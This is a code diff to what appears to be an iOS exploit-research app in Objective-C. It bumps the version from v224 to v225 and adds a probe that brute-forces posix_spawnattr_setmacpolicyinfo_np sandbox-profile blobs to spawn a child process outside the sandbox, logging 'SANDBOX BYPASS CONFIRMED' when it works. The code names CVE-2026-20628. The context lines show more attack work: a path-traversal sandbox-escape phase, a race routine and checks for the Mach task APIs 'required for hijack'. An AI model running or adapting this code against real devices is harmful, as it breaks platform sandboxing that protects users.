@@ -943,7 +943,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *rieConf = [UIButtonConfiguration filledButtonConfiguration];
     rieConf.baseBackgroundColor = [UIColor systemPinkColor];
     self.rieProbeButton.configuration = rieConf;
-    [self.rieProbeButton setTitle:@"Rie Direct 536 (v224)" forState:UIControlStateNormal];
+    [self.rieProbeButton setTitle:@"Rie SBX spawn (v225)" forState:UIControlStateNormal];
     [self.rieProbeButton addTarget:self action:@selector(rieProbeTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.rieProbeButton];
 
@@ -9166,7 +9166,7 @@ static uint64_t rie_find_exec_base(task_t task,
 
 - (void)rieProbeTapped {
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
-        [self appendLog:@"\n=== Rie v224: capture mainHdrAddr, fix read convention, cap fd=-1 size ===\n"];
+        [self appendLog:@"\n=== Rie v225: CVE-2026-20628 sandbox-spawnattrs brute-force ===\n"];
         NSString *traversalPrefix = @"../../../../../../../../../../../../../";
 
         // ── Phase S: sandbox escape probe (CVE-2026-28995 technique) ──
@@ -9750,6 +9750,89 @@ static uint64_t rie_find_exec_base(task_t task,
         else { [rpt appendString:@"[miss:TSS] "]; missing++; }
         [self appendLog:rpt];
         [self appendLog:[NSString stringWithFormat:@"Total: %d available, %d missing", avail, missing]];
+
+        // ── Phase B-2: CVE-2026-20628 sandbox-spawnattrs brute-force ──
+        [self appendLog:@"\n── Phase B-2: sandbox-spawnattrs (CVE-2026-20628) probe ──"];
+
+        typedef int (*Rie_SetMacPolicyInfoFn)(void *, const char *, void *, size_t);
+        Rie_SetMacPolicyInfoFn setMacPolicy_fn = dlsym(RTLD_DEFAULT,
+            "posix_spawnattr_setmacpolicyinfo_np");
+
+        if (!setMacPolicy_fn) {
+            [self appendLog:@"posix_spawnattr_setmacpolicyinfo_np: NOT FOUND in libsystem"];
+        } else {
+            [self appendLog:@"posix_spawnattr_setmacpolicyinfo_np: AVAILABLE"];
+
+            static const char *profiles[] = {
+                "platform", "no-internet", "baseline", "container", "no-network",
+            };
+            static const int nProfiles = sizeof(profiles)/sizeof(profiles[0]);
+            static const char *fmtNames[] = {"empty","str","ver+str","len+str","2str"};
+            static const int nFmts = sizeof(fmtNames)/sizeof(fmtNames[0]);
+
+            NSString *childPath = [[[NSBundle mainBundle] bundlePath]
+                stringByAppendingPathComponent:@"rie_child"];
+            NSString *tmpChild_sbx = [NSTemporaryDirectory()
+                stringByAppendingPathComponent:@"rie_child_sbx"];
+            [[NSFileManager defaultManager] removeItemAtPath:tmpChild_sbx error:nil];
+            BOOL hasChild = [[NSFileManager defaultManager] copyItemAtPath:childPath
+                                                                   toPath:tmpChild_sbx error:nil];
+            if (hasChild) chmod([tmpChild_sbx UTF8String], 0755);
+
+            BOOL sbxSuccess = NO;
+            char *cpath_sbx = (char *)[tmpChild_sbx UTF8String];
+            char *cargs_sbx[] = { cpath_sbx, NULL };
+
+            for (int pi = 0; pi < nProfiles && !sbxSuccess && hasChild; pi++) {
+                const char *prof = profiles[pi];
+                size_t profLen = strlen(prof);
+
+                for (int fi = 0; fi < nFmts && !sbxSuccess; fi++) {
+                    uint8_t blob[256];
+                    size_t blobLen = 0;
+
+                    switch (fi) {
+                    case 0: blobLen = 0; break;           // empty
+                    case 1: memcpy(blob, prof, profLen+1); blobLen = profLen+1; break;  // C string
+                    case 2: { uint32_t v=1; memcpy(blob,&v,4); memcpy(blob+4,prof,profLen+1); blobLen=4+profLen+1; break; } // ver+str
+                    case 3: { uint32_t l=(uint32_t)profLen; memcpy(blob,&l,4); memcpy(blob+4,prof,profLen); blobLen=4+profLen; break; } // len+str
+                    case 4: memcpy(blob,prof,profLen+1); blob[profLen+1]='\0'; blobLen=profLen+2; break; // two strings
+                    }
+
+                    posix_spawnattr_t spattr;
+                    if (posix_spawnattr_init(&spattr) != 0) continue;
+
+                    int rc_mac = setMacPolicy_fn(&spattr, "Sandbox",
+                        blobLen ? blob : NULL, blobLen);
+                    if (rc_mac != 0) {
+                        posix_spawnattr_destroy(&spattr);
+                        continue;
+                    }
+
+                    pid_t pid_sbx = -1;
+                    int rc = posix_spawn(&pid_sbx, cpath_sbx, NULL, &spattr,
+                                         cargs_sbx, NULL);
+                    posix_spawnattr_destroy(&spattr);
+
+                    if (rc == 0) {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"*** SUCCESS: profile=\"%s\" fmt=\"%s\" pid=%d ***",
+                            prof, fmtNames[fi], pid_sbx]];
+                        kill(pid_sbx, SIGKILL);
+                        int st; while (waitpid(pid_sbx, &st, 0) < 0 && errno == EINTR);
+                        sbxSuccess = YES;
+                    } else if (fi == 0) {
+                        [self appendLog:[NSString stringWithFormat:
+                            @"  profile=\"%s\": all fmts failed (sample rc=%d)", prof, rc]];
+                    }
+                }
+            }
+
+            if (sbxSuccess)
+                [self appendLog:@"*** SANDBOX BYPASS CONFIRMED via spawnattrs ***"];
+            else
+                [self appendLog:@"sandbox-spawnattrs: ALL COMBOS FAILED — CVE-2026-20628 not viable or blob format unknown"];
+        }
 
         // All 7 Mach remote-task APIs required for hijack
         BOOL canHijack = (task_for_pid_fn && task_threads_fn && task_resume_fn &&
